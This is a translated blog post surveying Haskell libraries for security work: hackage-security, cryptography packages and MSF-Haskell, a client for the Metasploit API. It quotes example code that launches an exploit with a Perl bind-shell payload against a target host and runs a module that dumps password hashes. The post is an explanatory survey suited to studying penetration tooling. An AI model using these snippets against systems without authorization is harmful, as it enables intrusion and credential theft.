# Haskell 的安全性

> 原文：<https://dev.to/terceranexus6/security-with-haskell-3cio>

从“*你疯了*”到“*为什么还要？*“这是我在计算机科学领域的朋友告诉我的一些事情，当我开始与 Haskell 一起工作时，特别是在安全性方面。按顺序回答，是的，我疯了，但不是因为 Haskell，嗯，我选择使用 Haskell 是出于安全考虑。首先，函数式编程*是新的黑色*，可能会有越来越多的应用程序使用它来构建。为了安全而选择纯函数式语言并没有那么疯狂。另一方面，Haskell 的数学方法在密码学中非常有用。

[![](img/bf10463300abf856525d30809f53d162.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--JU9VWTow--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://78.media.tumblr.com/tumblr_lpkxtmFtmp1qc8ie7o1_500.gif)

那么，我如何使用 Haskell 进行审计安全呢？

我想在这里指出一个名为 [hackage-security](https://hackage.haskell.org/package/hackage-security) 的特定库，它目前只支持索引签名。正如维基中所描述的，*图书馆有两个主要入口: [Hackage。安全。客户](https://hackage.haskell.org/package/hackage-security-0.5.3.0/docs/Hackage-Security-Client.html)是客户的主要入口，而[是黑客。服务器](https://hackage.haskell.org/package/hackage-security-0.5.3.0/docs/Hackage-Security-Server.html)是服务器的主要入口点。值得一查。*

除此之外，github 中还有一个名为 [MSF-Haskell](https://github.com/GaloisInc/msf-haskell) 的库，允许使用 Haskell 执行渗透测试。它还包括 haskell 中的一个脚本作为例子，以及整个白皮书。它实际上是 Metasploit API 的一个实现，使开发人员能够编写与 Metasploit 服务器通信的 Haskell 客户端。例如，在示例脚本的部分中，启动了针对目标主机的示例利用。

```
launchExploit :: (LoudCxt s) => Host Attackable -> MSF s ()
launchExploit targetHost = do
  _ <- module_execute metasploitableModuleType metasploitableModuleName
      $ toObject
      $ Map.fromList
          [ ("RHOST",   toObject targetHost)
          , ("PAYLOAD", toObject metasploitablePayload)
          ]
  return () 
```

Enter fullscreen mode Exit fullscreen mode

我们之前定义了有效载荷本身:

```
metasploitablePayload = Payload "cmd/unix/bind_perl" 
```

Enter fullscreen mode Exit fullscreen mode

或者这部分用于抓取密码哈希:

```
gatherCredentials :: (LoudCxt s) => SessionId -> MSF s ()
gatherCredentials sessionId = do
  let modTyp = PostModuleType
      modNm = ModuleName "linux/gather/hashdump"

  r <- module_execute modTyp modNm
      $ toObject
      $ Map.fromList
          [ ("SESSION",   toObject sessionId)
          ]
  case r of
    (ExecJobId j) -> waitJob j
    _             -> return () 
```

Enter fullscreen mode Exit fullscreen mode

总而言之，Haskell *可能会成为安全领域*功能性*脚本的一个选项。 [*也许*](https://wiki.haskell.org/Maybe) good_option，你知道，只是一个选项或者什么都没有，哈哈功能性玩笑，badum tss。*

[![](img/d6ed80d08df9d29b9060a3f4e1a65dc6.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--HSyOSaL3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/http://cuddlebuggery.com/wp-content/uploads/2012/08/Ba-dum-tish.png)

无论如何，这些都是全新类型的攻击！即使是从零开始，也不使用如前所述的 API 实现。说到加密，这个 [repo](https://github.com/mfourne/eccrypto.git) 很有趣，因为它处理椭圆曲线加密。Welp，我邀请你们所有人来看看 Haskell 官方网站上的[加密库](https://hackage.haskell.org/packages/search?terms=cryptography)，以及安全库[库](https://hackage.haskell.org/packages/search?terms=security)。我还在调查，所以如果有人在这同一领域工作，请提供更多信息！